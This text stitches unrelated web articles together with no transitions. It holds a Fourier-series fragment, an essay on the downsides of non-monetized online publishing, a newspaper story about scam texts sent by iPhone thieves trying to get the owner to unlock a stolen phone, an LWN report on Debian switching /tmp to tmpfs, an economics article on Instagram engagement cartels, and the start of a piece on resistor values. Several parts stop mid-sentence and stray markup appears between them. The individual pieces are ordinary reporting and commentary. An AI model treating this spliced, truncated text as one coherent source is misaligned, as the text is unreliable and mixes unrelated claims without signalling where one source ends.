<p>If we run our signal through the <em>Fourier Series Machinery</em>, we will obtain <em>The Amplitude</em> (\(A\)) and <em>The Phase</em> (\(\varphi\)) for each Frequency (\(\omega\)) from \(1\) to \(N\). Isn’t it amazing? And it all comes down to a bunch of spinning circles… on a stick.</p>

<div id="readability-page-1" class="page"><div><article><div dir="auto"><p><span>I’ve been putting content on the internet for all of my adult life. The works ranged from security research, to open-source projects, to long-term writing on a variety of topics. In an </span><a href="https://lcamtuf.substack.com/p/you-should-write-more" rel="">earlier article</a><span>, I extolled the virtues of publishing just for the sake of it:</span></p><blockquote><p><em>“The concepts in our heads are nebulous and ever-shifting. Putting them on paper forces us to pressure-test our assumptions and address gaps.</em></p><p><em>You don’t need to be the world’s leading expert to write about a particular topic. Experts are often busy and struggle to explain concepts in an accessible way. You should be honest with yourself and with your readers about what you know and don’t know — but otherwise, it’s OK to write about what excites you, and to do it as you learn.”</em></p></blockquote><p>For over two decades, I resisted the desire to monetize my side projects. Part of it was pragmatic: my career paid better than what I could realistically make by cramming ads into articles or selling geeky books. But just as important, I didn’t want to turn a hobby into yet another chore.</p><p>Today, I’d like to share some of the less obvious takeaways from the journey so far.</p><p>By refusing to monetize, you give up most of the tangible upsides of online publishing — but the downsides stay with you either way. In the long haul, you should expect to spend as much time putting out fires and wrangling the technology as you spend on creative pursuits.</p><p>To give you a taste, I had my website randomly delisted by Google, hijacked by SEO spammers in Bing, repeatedly flagged by antivirus tools, and hit with bogus abuse and copyright claims; in each case, it took weeks to get it sorted out, often having to lean on informal connections to get through.</p><p>When I self-hosted, I had to deal with endless configuration and maintenance tasks — and at one point, an outright server compromise. Third-party hosting is easier until it isn’t.

The costs range from photo and video gear, to software licenses, to the procurement of </span><a href="https://lcamtuf.substack.com/p/a-brief-history-of-counting-stuff" rel="">antique calculating machines</a><span> and </span><a href="https://lcamtuf.substack.com/p/comparing-hobby-pcb-vendors" rel="">random PCBs</a><span>.</span></p><p>Unless you’re a pop star, you are unlikely to gain devoted fans who follow you around. Most of the time, when we come across helpful content on the internet, we don’t think much of the stranger who put it out there. We just take the experience for granted and move on.</p><p>Online hate isn’t so fleeting. Sooner or later, you come across a heckler who follows you around and makes it their life’s mission to “debunk” your claims — or simply hurl insults in your general direction without any pretense of being constructive.</p><p>This seems worse than it really is. Putting others down on the internet is a pretty miserable hobby — often just a way for the other person to cope with their own insecurities and stress.  But still, early on, it plays tricks with your mind — what if I’m really as clueless as they say?</p><p><span>If your content upsets another person, it still means you have an audience. More often than not, the controversy pulls in bystanders and lets them make up their own minds. There </span><em>is</em><span> such a thing as bad press, but on the internet, the threshold is pretty high.</span></p><p><span>What stings far more is when you get no reaction whatsoever: all of sudden, the content’s most important </span><em>raison d'etre</em><span> is lost. Few bloggers or vloggers quit because of the occasional snide remark; many give up when their metrics don’t budge post after post.</span></p><p><span>The process of building an online audience is slow and unpredictable, so my best advice is to pick a platform that doesn’t rub your nose in it. I’ve previously written about my </span><a href="https://lcamtuf.substack.com/p/youtube-is-hell" rel="">special dislike of YouTube</a><span>, where the entire creator experience revolves around view counts:</span></p><blockquote><p><em>“The complexity of the medium is not YouTube’s fault. What I fault them for, however, is that they deliberately thrust authors into a global popularity contest — and offer no reprieve. You can use Reddit, Twitter, or Facebook to hang out with friends without knowing who’s the highest-ranking influencer of the week. On YouTube, view counts are all there is — inescapable and in-your-face.</em></p><p><em><strong>[A thumbnail of a woman flipping off an Alaskan malamute, 82M views]</strong></em></p><p><em>Even in the privacy of your own channel, you’re being compared: to the right of your video, you see similar clips from strangers, along with their scores. The takeaway is simple: there must be something wrong with you if you can’t compete with a person flipping off their dog.”</em></p></blockquote><p><span>Most social media platforms use </span><em>algorithmic feeds</em><span> — that is, they decide what to show not based on their users’ explicit preferences, but on what’s most likely to elicit a response and keep the user engaged. Because of this, follower counts are fairly meaningless: just because a person follows you on Instagram or Facebook, it doesn’t mean they will ever see your posts.</span></p><p>To be fair, the platform you’re reading this on — Substack — is a bit of an outlier. They deliver every post via email, so if a subscriber is still alive and the mails are not ending up in spam, they will see what you have to say. But for a more typical data point, let’s have a look at Twitter: I have 35k+ followers over there, but this translates to just about 1,000 to 2,000 impressions on a typical post. YouTube is the same: I notionally have 1,100 followers there, but a video that isn’t promoted elsewhere tends to get 50-100 views.</p><p>I’m not sure there’s any special takeaway to this — except, if you want to build an audience around subscriptions, make sure they are real. And don’t assume that people with 100k or 1M followers have anything resembling this kind of reach.</p><p>If you ask an average person what’s corrupting the internet, they will probably point to monetization. But it’s not just about money; non-commercial content creators are getting comically distorted signals too.</p><p><span>For example, did you know that my Substack audience is telling me I should stop writing? It’s true: whenever I post a new article, I reliably lose subscribers.

<div id="readability-page-1" class="page"><div><!--[--><!--[--><div><p><i>A version of this story originally appeared in</i> <a href="https://maxread.substack.com/p/iphone-thieves-copypasta" rel="noopener" target="_blank"><i>Read Max</i></a><i>, a twice-weekly newsletter about tech, politics, culture, and media.</i></p><p>My phone was stolen in early March, most likely while I was standing on the platform at the York Street station waiting for the F train. Fifteen minutes later, in a food hall under the movie theater where my boyfriend and I were supposed to see “Dune 2,” I reached into my pocket and realized it was gone. He looked at the Find My app on his phone: My phone was “last seen” at York Street but wasn’t registering a current location. Someone had turned it off.</p><p>As quickly as possible, I did <a href="https://support.apple.com/en-us/101593" rel="noopener" target="_blank">all the things you’re supposed to do when your phone is lost or stolen</a> —- mark it as lost, cut off service, and remotely erase it. I spent the rest of the night anxiously refreshing the Find My app, watching my phone move around Manhattan before it finally stopped at Rockefeller Center. I didn’t bother confronting the thief. Worst of all, we didn't even see “Dune 2.”</p><p>After two hours in the Williamsburg Apple Store the next morning, I had a new iPhone 15 and I stopped stressing. As long as I didn’t remove the phone from my Apple account or the Find My app, the phone was essentially bricked to anyone without the passcode <i>and</i> my iCloud password — unusable by the thieves, or the fences who I assume bought it from them. Now my phone was their problem.</p><p>Where had my phone gone? I learned (from Reddit comments – where else?) that stolen iPhones usually end up sold in bulk online, either directly by the thief or by a fence who buys stolen phones individually and <i>then</i> sells them in bulk. The purchasers are either <a href="https://www.reddit.com/r/Flipping/comments/fw7s3v/my_experience_with_liquidationcom/" rel="noopener" target="_blank">looking for parts</a> or think they can crack into the phones, wipe and resell them. This teenager on YouTube, for example, <a href="https://www.youtube.com/watch?v=26bdjJqWdCo" rel="noopener" target="_blank">bought a box of stolen iPhones</a> for $1,300 on Liquidation.com:</p></div><!--]--><!--[--><div><p>

</p>
</div><!--]--><!--[--><div><p>As you can see, most of the phones she tried didn’t have passcodes but were still linked to iCloud accounts, which meant she (or anyone buying the phones) still had access to all of the original owners’ texts, emails and photos. She sent a message to each iCloud email offering to give people their phones back, but only one guy replied.</p><p>I, sadly, did not get a message from a teenage YouTuber earnestly offering to return my stolen phone. Instead I received a series of texts from someone cycling through a number of different strategies for engaging, convincing, tricking or scaring me into unlocking the phone for them.</p><p>Rather than being engaged, convinced, tricked or scared, however, I was delighted. The experience managed to combine the internet's promises of international communion and international crime.</p><p>There was something oddly soothing about being in touch with the people who’d stolen my phone. Instead of it disappearing into the ether, I knew more or less where it was, and thanks to these texts, I knew that it was a source of frustration to the people who’d gotten their hands on it. As the texts escalated in complexity and rage, I sympathized with their plight. I mean, not enough to unlock my phone. But we’ve all been there – sometimes you get stuck with a difficult project at work.</p><p>In case you find yourself in a similar situation, here are some things the guys who stole (or later purchased) my iPhone have told me to try to get me to unlock it.</p></div><!--]--><!--[--><p><h5><b>1) “Your iPhone 14 Pro is trying to pay with Apple Pay in China.”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>The first text I received from the scammers.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>The first text I got from my new friends was sent on April 28, a few weeks after the phone was stolen, and I have to be honest … it kind of got me, at least for a second. It helped that, even though this text came from a clearly bogus iCloud email address, Apple’s own “helpful” iMessage feature was sort of fooled: the auto-filled contact name said “Maybe: Apple Pay.” Maybe!</p><!--]--><!--[--><figure><figcaption><!----><p>Apple’s own “helpful” iMessage feature was sort of fooled: the auto-filled contact name said “Maybe: Apple Pay.” Maybe!</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>At this point, my phone was in Sunnyside, Queens:</p><!--]--><!--[--><figure><figcaption><!----><p>My phone was camped out in Sunnyside, Queens for a bit.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>My old phone's new owners persisted with this tactic for a while. I later got the same message again, but from a different iCloud address. Two weeks after that, on May 12, I got an identical message in which “USA” had been replaced with “China.” I'm guessing it was intended to dial up the panic, but instead it made me feel cosmopolitan and sophisticated.</p><!--]--><!--[--><p><h5><b>2) “Iv'e bought an iPhone 14 Pro I'm using, it have your messages, emails, cards, bank, notes and personal information on it”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>Posing as the unwitting new owners of a stolen iPhone, the scammer continued to try to get me to unlock the phone.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>On May 13, my pen pals reached out from a Filipino phone number. They'd switched from the impersonal "Apple Pay warning" texts to claiming that they were the unwitting new owners of a stolen iPhone. I appreciated this more intimate approach – the message even came from a phone number rather than email address, which was a nice touch – and I was glad to hear they were concerned about my insurance claim. “Best of luck!” I texted back.</p><!--]--><!--[--><p><h5><b>3) “Your old iPhone 14 Pro is recycled by us, we are just recycling merchants, we are not the ones who steal your phone”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>This was my favorite text.

This was one of my favorites: Sure, there’s an implicit threat (“hackers” might “contact my family” to, what, send them thousands of photos of my dog??), but it's not just some poor sap I'm supposed to help, it's the <i>planet</i>. Who am I to stand in the way of recycling? I replied:</p><!--]--><!--[--><figure><figcaption><!----><p>I loved lying to the scammers.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p><h5><b>4) “The phone is going be auctioned on the black market with your personal information and everything about you that you had on it.”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>I appreciated the use of CAPS in this one.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>I got this one on the same day (May 14), from the Filipino number, which had previously claimed to be some guy who’d accidentally bought my phone.</p><!--]--><!--[--><p><h5><b>5) “Your old iPhone has been disassembled… you do not want to take it back, because it does not belong to the law of the United States”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>This is where things started escalating.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><div><p>At the same time, I got this nearly identical message from the U.K. number. Thanks to Reddit, I discovered that most of the messages I was getting were <a href="https://www.reddit.com/r/iphone/comments/1abu8ec/my_phone_got_stolen_and_this_is_what_they_texted/" rel="noopener" target="_blank">scammer copypasta</a>: English phrases and texts that were passed around between thieves, fences and jailbreakers to entice bereft phone owners like me.</p><p>In the end I think these two texts provide a lesson in the importance of great openers. While the previous message didn’t move me much, it’s hard not to admire the arresting visuals of the detailed iPhone breakdown, the reference to “the law of the United States,” the mocking “you’ll never catch me.” It’s an incredible intro that really elevates the literary value of what would otherwise be a rote bit of vaguely threatening text! ! ! ! ! !</p><p>In any event, I will credit them with being honest: I checked Find My and my phone was indeed in China. It looked like it was in an office building conveniently located around the corner from an Adidas store, about 8,000 miles from me.</p></div><!--]--><!--[--><figure><figcaption><!----><p>My iPhone took a little trip!</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p><h5><b>6) “Listen!

This text (more <a href="https://www.reddit.com/r/copypasta/comments/13tv0r3/someone_who_got_their_iphone_stolen_got_this/" rel="noopener" target="_blank">scammer copypasta</a>) was accompanied by two videos. One video showed a “hacker” breaking into someone’s iPhone and going through their camera roll, which was a mix of selfies and graphic videos. Another appeared to be a screen recording of a social video of a man showing off his gun. I guess this is supposed to be the guy named “Miami” who is going to come kill me and my whole family “on Monday.” I haven’t heard from them since.</p><!--]--><!--]--></div></div>]]></description>

<p>Debian had a major <a href="https://lwn.net/Articles/499410/">discussion</a>
about mounting <tt>/tmp</tt> as a RAM-based tmpfs in 2012 but inertia
won out in the end. Debian systems have continued to
store temporary files on disk by default. Until now. A mere 
12 years later, the project will be switching to a RAM-based <tt>/tmp</tt> in the Debian
13 ("Trixie") release. Additionally, starting with Trixie, the
default will be to periodically clean up temporary files automatically in
<tt><nobr>/tmp</nobr></tt> and <tt><nobr>/var/tmp</nobr></tt>. Naturally, it involved a lengthy discussion first.</p>

<h4>Join the party</h4>

<p>By now, using tmpfs for the <tt>/tmp</tt>
directory is a road well-traveled. Many Linux distributions have already switched to mounting
<tt>/tmp</tt> as a tmpfs. Arch Linux, Fedora, openSUSE
Tumbleweed, and many others have all made the switch. Red Hat Enterprise Linux (RHEL) and its
clones, as well as SUSE Linux Enterprise Server (SLES) and openSUSE Leap, still default to <tt>/tmp</tt> on
disk. Ubuntu, following Debian, also continues to have a disk-based
<tt>/tmp</tt> rather than using tmpfs.</p>

<p>The knobs to control how <tt>/tmp</tt> is mounted, and the handling
of temporary files, <a href="https://systemd.io/TEMPORARY_DIRECTORIES/">are part of
systemd</a>. (On systems where systemd is used, of course.) The
upstream defaults for systemd are to mount <tt>/tmp</tt> as a tmpfs
and delete files that have not been read or changed after ten days in
<tt>/tmp</tt> and 30 days for those stored in <tt>/var/tmp</tt>.
Debian Developer and systemd contributor Luca Boccassi recently
decided it was time to revisit the topic of <tt>/tmp</tt> as a tmpfs,
and start deleting temporary files in <tt>/tmp</tt> and
<tt>/var/tmp</tt>.</p>

<p>On May 6 Boccassi
<a href="https://lwn.net/ml/debian-devel/ebee234c6f72eb7dfe55809821c038491bfea542.camel@debian.org/">resurrected</a> a discussion from Debian's bug
tracker that started in 2020 and that had trailed off in July 2022 without resolution. The bug
was submitted by Eric Desrochers, who <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=966621#5">complained</a> that
Debian's systemd implementation did not clean <tt>/var/tmp</tt> by
default. Michael Biebl <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=966621#10">wrote</a>
that this was a deliberate choice to match Debian's pre-systemd
behavior. After a long period of inactivity, Biebl <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=966621#35">suggested</a>
in October 2021 (and <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=966621#40">again</a> in July 2022) that Desrochers raise the topic on the Debian devel
mailing list. That never happened.</p>

<p>In reviving the topic, Boccassi declared that it was time to bring Debian's defaults in
line with upstream and other Linux distributions by making
<tt>/tmp</tt> a tmpfs, and cleaning up <tt>/tmp</tt> and <tt>/var/tmp</tt> on a
timer. He planned to apply those changes in the next systemd upload to
Debian unstable within a week, with instructions in the <tt>NEWS</tt> file on
how to override the changes for any users who wanted to keep the
current behavior. That, in turn, sparked quite a discussion.</p>

<h4>The case for and against</h4>

<p>Biebl <a href="https://lwn.net/ml/debian-devel/abb5af73-7b68-4880-b0fc-622112bf4403@debian.org/">worried</a>
about the effect of cleaning up temporary files by default. Currently,
he said, Debian only cleans <tt>/tmp</tt> on boot (which is
unnecessary if <tt>/tmp</tt> is a RAM-based tmpfs) and to never clean
up files in <tt>/var/tmp</tt>. Boccassi <a href="https://lwn.net/ml/debian-devel/CAMw=ZnQuCfngAWSrZrJCXxru61EVtfsOMjw-5fFHrPQ11U4L9Q@mail.gmail.com/">answered</a>:
"<q>Defaults are defaults, they are trivially and fully overridable
where needed if needed.</q>" Biebl <a href="https://lwn.net/ml/debian-devel/4b514ecf-d6b1-4208-9be3-ffa3f988da32@debian.org/">replied</a>
that there is value in aligning defaults across Linux distributions,
but argued that Debian has "<q>a larger scope</q>" than a desktop
distribution like Fedora. He suggested that it was necessary to "<q>gather feedback from all affected parties 
to make an informed decision</q>". Boccassi <a href="https://lwn.net/ml/debian-devel/CAMw=ZnRzXjern5wD60Gb+uUmxyTk_duK8jGNND16EA3xpDPVNw@mail.gmail.com/">responded</a>
that it was impossible to have defaults that would make everyone
happy, and he was not looking for hypothetical arguments or
philosophical discussions, he wanted facts: "<q>what would
break where, and how to fix it?</q>"</p>

<p>Sam Hartman <a href="https://lwn.net/ml/debian-devel/tsla5l1d1kh.fsf@suchdamage.org/">noted</a>
that <tt>ssh-agent</tt> created its socket under <tt>/tmp</tt>, but it would be
better if it respected the <tt>$XDG_RUNTIME_DIR</tt> setting and
created its socket under <tt>/run/user</tt>. Boccassi
<a href="https://lwn.net/ml/debian-devel/CAMw=ZnQ9TedkhqkAv-+SYV9+_rRwnxc8H7y=mUS1DgY2oV7wkw@mail.gmail.com/">agreed</a>
and said that he had <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1070725">filed a bug</a> for <tt>ssh-agent</tt>. Richard Lewis
<a href="https://lwn.net/ml/debian-devel/86seyuk41q.fsf@simplex.rtf.org.uk/">pointed
out</a> that tmux stores its sockets in <tt>/tmp/tmux-$UID</tt>, and
deleting those files might mean users could not reattach to a tmux
session that had been idle a long time. Boccassi <a href="https://lwn.net/ml/debian-devel/CAMw=ZnSYrqwd5s6u1fhT1dx+W2E1Ti3Y84eWAKs9iKZN_O5=OA@mail.gmail.com/">suggested</a>
that using <a href="https://manpages.debian.org/testing/manpages-dev/flock.2.en.html"><tt>flock()</tt></a>
would be the right solution to stop the deletion, and <a href="https://lwn.net/ml/debian-devel/CAMw=ZnRT3OeZwZ6M=X_fLdWo5Saf6Xgn04UnS_9yywCbfjhGfg@mail.gmail.com/">said</a>
he had <a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1070724">filed a bug</a> on that as well.</p>

<p>Lewis <a href="https://lwn.net/ml/debian-devel/86ikzpjq8k.fsf@simplex.rtf.org.uk/">questioned</a>
whether files downloaded with <tt>apt&nbsp;source</tt> might be
considered "old" when they were extracted under <tt>/tmp</tt> and
immediately flagged to be deleted. Russ Allbery <a href="https://lwn.net/ml/debian-devel/87cypxfgi9.fsf@hope.eyrie.org/">said</a>
that <tt>systemd-tmpfiles</tt> would respect the access timestamp (atime)
and changed timestamp (ctime), not just the modified timestamp
(mtime), "<q>so I think this would only be a problem on file systems that didn't support
those attributes</q>". Allbery said he believed tmpfs supports all three.</p>

<p>Some users store information in <tt>/var/tmp</tt> for long-running
jobs, because they want it preserved without being backed up, <a href="https://lwn.net/ml/debian-devel/CANa01B+C2Z6o=QEv33Ovd8pDM4+MqmCZ2L4T2g4nNY4Gj13-dg@mail.gmail.com/">said</a>
Barak A. Pearlmutter. Boccassi <a href="https://lwn.net/ml/debian-devel/CAMw=ZnT_bYrBRm7j3iU5sN=dtzvHcf0vaRH=Xxc7xEVjQ=txWA@mail.gmail.com/">dismissed</a>
that, saying that those users "<q>assuming they actually exist</q>",
can customize the system defaults according to their needs.</p>

<p>Those users do exist, <a href="https://lwn.net/ml/debian-devel/D14DPA7WSVOK.2LV6HCA1DS4F5@debian.org/">wrote</a>
Jonathan Dowland, "<q>[I've] been one of them, I've worked with many of
them, it's an incredibly common pattern in academic
computing</q>". Making a change to how these files are handled,
"<q>should be a very carefully explored decision</q>". He also
asked for arguments in favor of the change, and to hold off the change
to allow the discussion to continue.</p>

<p>Hartman <a href="https://lwn.net/ml/debian-devel/tsla5l11xl6.fsf@suchdamage.org/">wished</a>
that it was possible to specify that directories under
<tt>/var/tmp</tt> should be deleted entirely or left alone. Boccassi
said that was a reasonable enhancement request, and that it had
already been <a href="https://lwn.net/ml/debian-devel/CAMw=ZnRbG9EJgu1VDYCwxDYAtmwDj+UrxgxiXkxWgyqOY8UZtw@mail.gmail.com/">filed
upstream</a> for systemd.</p>

<p>Allbery eventually <a href="https://lwn.net/ml/debian-devel/87h6f9hev0.fsf@hope.eyrie.org/">admitted
surprise</a> at the number of people who reported using
<tt>/var/tmp</tt> "<q>for things that are clearly not temporary
files in the traditional UNIX sense</q>". Periodically deleting files
in <tt>/var/tmp</tt>, he said, has been common UNIX practice for at
least 30 years:</p>

<blockquote>
Whatever we do with /var/tmp retention, I beg people to stop using
/var/tmp for data you're keeping for longer than a few days and care about
losing.  That's not what it's for, and you *will* be bitten by this
someday, somewhere, because even with existing Debian configuration many
people run tmpreaper or similar programs.  If you are running a
long-running task that produces data that you care about, make a directory
for it to use, whether in your home directory, /opt, /srv, whatever.
</blockquote>

<p>Hakan Bayındır <a href="https://lwn.net/ml/debian-devel/812a6293-c157-484e-9fc0-002692ad733a@bayindir.org/">said</a>
that he did not use <tt>/var/tmp</tt>, but applications that
other people use do. He cited a high-end scientific application that was
not under his or other users' control. Allbery argued that this
was "<q>not a good design decision</q>" but conceded that may not be
helpful if a user or admin does not have control over the
application's design. However, he said, it was "<q>playing with fire</q>"
to use <tt>/var/tmp</tt> that way "<q>and it's
going to result in someone getting their data deleted at some point,
regardless of what Debian does</q>".</p>

<p>Lewis <a href="https://lwn.net/ml/debian-devel/86h6f9jop1.fsf@simplex.rtf.org.uk/">said</a>
he still did not understand the rationale for the change. Was there,
he asked, "<q>perhaps something more compelling than 'other
distributions and upstream already do this'?</q>" That sounded like
the original rationale, <a href="https://lwn.net/ml/debian-devel/878r0lffbs.fsf@hope.eyrie.org/">Allbery
said</a>, but he added that moving <tt>/tmp</tt> to tmpfs should make
applications run faster, and reaping files under <tt>/var/tmp</tt>
could help to avoid filling up a partition. Allowing the partition to
fill up, he noted, could
cause bounced mail, unstable services, and other problems. It may not
be a problem for desktop systems, which tend to have enough disk space
not to be affected, but for virtual machines that have <tt>/var/tmp</tt>
contained within a small root partition, it is still a concern.</p>

<h4>Rolling out changes</h4>

<p>In the end, none of the arguments for maintaining Debian's status
quo managed to persuade Boccassi to stay his hand. On May 28, Boccassi <a href="https://lwn.net/ml/debian-devel/CAMw=ZnTPEbA7uZ4Cg2sx7PBZS2_Z_8-ZD7UDqoVWq6UasAcUxA@mail.gmail.com/">announced</a>
the changes that he had made and uploaded to unstable. As expected, <tt>/tmp</tt> will become a
tmpfs by default, for both new and existing installations. New
installs will use the systemd default behavior. The
<tt>openssh</tt> and <tt>tmux</tt> packages, he said, had been fixed
to provide exceptions to retain their temporary files. A description has been added
to the Debian installer to inform users that <tt>/tmp</tt> is a tmpfs
by default, and the changes have been noted in the <tt>NEWS</tt>
file. He also offered
to review and merge any changes to the Debian installer that would let
users customize those options during installation.
Users who want <tt>/tmp</tt> to remain on disk can override the
upstream default with <tt>systemctl&nbsp;mask&nbsp;tmp.mount</tt>. To
stop periodic cleanups of <tt>/tmp</tt> and <tt>/var/tmp</tt> users
can run <tt>touch&nbsp;/etc/tmpfiles.d/tmp.conf</tt>.</p>

<p>None of the changes, it should be noted, will affect Debian
versions prior to Trixie. Users of Debian stable and oldstable will
only encounter these changes on upgrade.</p>

<p>As noted, many distributions have already made these changes
without catastrophe. Debian, and its users, should be able to adapt to
the new defaults or override them if they are unsuitable for the
workloads to be run. At worst, it promises to be a temporary
inconvenience.</p><br clear="all">

                  <p>Imagine a university that rewards professors based on the number of citations to their research. In response, a group of colleagues might agree to cite each other’s work in every paper they write. What would be the positive and negative effects of our imaginary citation cartel? Economists are not known for excessive citations, which could be explained by positive externalities: the citing author bears all the costs, while the cited author reaps the benefits. As citing authors can’t internalise this positive externality, we end up with fewer citations than is socially optimal.</p>

<p>A citation cartel could solve this issue via reciprocal behaviour: by the cartel agreement, members would receive as many citations as they give. However, this can go too far. If this agreement requires citing unrelated papers, it might be good for group members but lead to meaningless literature reviews. Thus, the benefit of such agreements depends on their nature: making more effort to cite related papers could be good, while citing unrelated papers is probably bad.</p>

<p>Such academic citation cartels are not purely hypothetical. Academic journals have been found to form agreements to boost each other’s journals in the rankings (Van Noorden 2013). Similarly, universities have boosted their colleagues’ citation counts to advance in university rankings (Catanzaro 2024). Due to such citation patterns, Clarivate (Thomson Reuters) has excluded journals from Impact Factor listings, and most recently excluded the entire field of mathematics (Van Noorden 2013, Catanzaro 2024).</p>

<p>Academic citation cartels are difficult to study because there is no data on explicit cartel agreements. But in influencer marketing, cartel agreements are observable. In our new paper (Hinnosaar and Hinnosaar 2024), we study how influencers collude to inflate engagement and the conditions under which influencer cartels can be welfare-improving.</p>

<h2>Distorted incentives and fraudulent behaviour in influencer marketing</h2>

<p>Influencer marketing has become a key part of modern advertising. In 2023, spending on influencer marketing reached $31 billion, already rivalling the entirety of print newspaper advertising. Influencer marketing allows advertisers fine targeting based on consumer interests by choosing a good product-influencer-consumer match.</p>

<p>Many non-celebrity influencers are not paid based on the success of their marketing campaigns. In fact, less than 20% of companies track the sales induced by their influencer marketing campaigns. Instead, influencers’ pay is based on impact measures such as the number of followers and engagement (likes and comments), furnishing an incentive for fraudulent behaviour – for inflating their influence. Inflating influence is a form of advertising fraud that causes market inefficiencies by directing ads to the wrong audience. An estimated 15% of influencer marketing spending is misused due to exaggerated influence. To address this issue, the US Federal Trade Commission proposed a rule in 2023 to ban the sale and purchase of false indicators of social media influence. Cartels provide a way of obtaining fake engagement that does not fall directly under the proposed rule – because no money changes hands – but is still in the same spirit. While there is substantial literature on fake consumer reviews (Mayzlin et al. 2014, Luca and Zervas 2016) and other forms of advertising fraud (Zinman and Zitzewitz 2016), the literature on influencer marketing has focused mostly on advertising disclosure (Ershov and Mitchell 2023, Pei and Mayzlin 2022, Mitchell 2021, Fainmesser and Galeotti 2021), leaving the fraudulent behaviour unstudied.</p>

<h2>How do Instagram cartels work?</h2>

<p>An influencer cartel is a group of influencers who collude to boost their advertising fees by inflating engagement metrics. As in traditional industries (Steen et al. 2013), influencer cartels involve a formal agreement to manipulate the market for the members’ benefit. The cartels operate in online chatrooms. The screenshots below show how one such cartel operates in practice. The image on the left is from an online chat room, where cartel members submit links to their content for extra engagement. Before submitting a link, they must reciprocate by liking and commenting on other members’ posts. An algorithm enforces these rules. The image on the right shows these cartel-induced comments on Instagram. The cartel history and rules make it possible to observe which engagement (comments) originate from the cartel.</p>

<h2>What distinguishes ‘bad’ from ‘not-so-bad’ cartels?</h2>

<p>Our theoretical model formalises the main trade-offs in this setting, in the spirit of the imaginary citation group discussed earlier. The model focuses on strategic engagement, a decision that affects social media content distribution and consumption (Aridor et al. 2024) but has been underexplored (with the exception of Filippas et al. 2023, who studied attention bartering in Twitter). Engaging with other influencers’ content has a positive externality, leading to too little engagement in equilibrium. Forming a cartel to reciprocally engage with each other’s content can internalise this externality and might be socially desirable. However, it can also result in low-value engagement, especially when advertisers pay based on quantity rather than quality.</p>

<p>The key dimension to differentiating ‘bad’ from ‘not-so-bad’ cartels is the quality of cartel engagement. By ‘high quality’, we mean engagement coming from influencers with similar interests. The idea is that influencers provide value to advertisers by promoting a product among the target audience: people with similar interests, such as vegan burgers to vegans. If a cartel generates engagement from influencers with other interests (meat lovers), this hurts consumers and advertisers. It hurts consumers because the platform will show them irrelevant content, and advertisers are hurt because their ads are shown to the wrong audience. Whether or not a particular cartel is welfare-reducing or welfare-improving is an empirical question.</p>

<h2>Evaluating engagement quality using machine-learning methods</h2>

<p>To answer this empirical question, we use novel data from influencer cartels and machine learning to analyse Instagram text and photos. The cartel data allows us to directly observe which Instagram posts are included in the cartel and which engagement originates from the cartel (via cartel rules). Our dataset includes two types of cartels, differentiated by cartel entry rules: topic cartels (which only accept influencers posting on specific topics) and general cartels (with unrestricted topics).</p>

<p>Our goal is to compare the quality of natural engagement to that originating from the cartel. We measure the quality by the topic match between the cartel member and the Instagram user who engages. To quantify the similarity of Instagram users, we generate numeric vectors (embeddings) from the text and photos in Instagram posts using a large language model (Language-agnostic BERT Sentence Embedding) and an analogous large neural network (Contrastive Language Image Pre-training model). Then we calculate cosine similarity between the Instagram users based on these numeric vectors.</p>

<h2>Are the cartels likely to be welfare-improving?</h2>

<p>We find that engagement from general cartels is significantly lower in quality compared to natural engagement. Specifically, the quality of engagement from these cartels is nearly as low as that from a counterfactual engagement from a random Instagram user. In contrast, engagement from topic cartels is much closer to the quality of natural engagement.</p>

<p>The figure below illustrates these effects using raw data (see the paper for regression estimates, robustness checks, and additional analysis). It presents distributions of cosine similarity between the author and commenter, separately for general (left panel) and topic (right panel) cartels. It shows that non-cartel commenters (natural engagement) have the highest similarity with the author of the content, and random users have the lowest. Match quality from general cartels is similar to random engagement (left panel). In contrast, topic cartel engagement is much closer to natural engagement (right panel).</p>

<p><strong>Figure 2</strong> Probability density of authors’ similarity to commenters and random users in general cartels (left) and topic cartels (right)</p>

  


<p>Back-of-the-envelope calculations (based on regression analysis) show that if advertisers pay for cartel engagement as if it were natural engagement, they receive only 3–18% of the value with general cartels, and 60–85% with topic cartels. In other words, general cartels provide nearly worthless engagement for advertisers, while topic cartels cause less distortion.</p>

<h2>Conclusions and policy implications</h2>

<p>Our findings lead to three policy implications. First, since general cartels are likely to reduce welfare, stronger regulation of their activities would benefit society. Second, regulations that prohibit buying and selling fake social media indicators should also cover in-kind transfers, such as paying for engagement with reciprocal engagement. Third, the current practice of rewarding engagement quantity encourages harmful collusion. A better approach would be to compensate influencers based on the actual value they provide. Luckily, many advertisers are already moving in this direction. Until they get there, platforms could improve outcomes by reporting match-quality-weighted engagement.</p>

		<p>If you’ve been around electronics for a while, you’ve probably noticed that components like resistors, capacitors, zener diodes, and inductors come in some odd values. Looking at the chart below, there seems to be no clear rationale&nbsp;behind the values, but there is a pattern. 47kΩ resistors and 22μF capacitors are everywhere, but not 40kΩ or 50kΩ resistors, or 20μF or 30μF capacitors. So what’s the deal? It all has to do with <a href="http://en.wikipedia.org/wiki/Preferred_number" target="_blank" rel="noopener">preferred numbers</a>.</p>
